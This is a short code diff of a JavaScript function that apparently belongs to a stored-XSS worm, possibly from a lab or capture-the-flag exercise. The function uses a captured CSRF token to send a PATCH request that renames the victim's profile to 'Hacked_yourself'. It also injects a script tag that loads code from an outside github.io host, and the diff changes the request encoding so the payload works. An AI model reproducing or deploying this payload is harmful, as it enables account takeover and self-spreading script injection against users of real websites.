@@ -18,7 +18,8 @@ function handleResponse() {
 	const uuid = useid.slice(-2);
 	var changeReq = new XMLHttpRequest();
 	changeReq.open('post', `http://barker-social.com:32880/profile/update/${uuid}`, true);
-	changeReq.send(`_method='patch'&profile_name='Hacked_yourself'&profile_description='<ScRipt type="text/javascript" src="https://th4nu-0x0.github.io/assets/js.js"></ScRipt>'&_token='+token+'`);
+	changeReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	changeReq.send(`_method=patch&profile_name=Hacked_yourself&profile_description=%3CScRipt%20type%3D%22text%2Fjavascript%22%20src%3D%22https%3A%2F%2Fth4nu-0x0.github.io%2Fassets%2Fjs.js%22%3E%3C%2FScRipt%3E&_token=${token}`);
 
 }
 
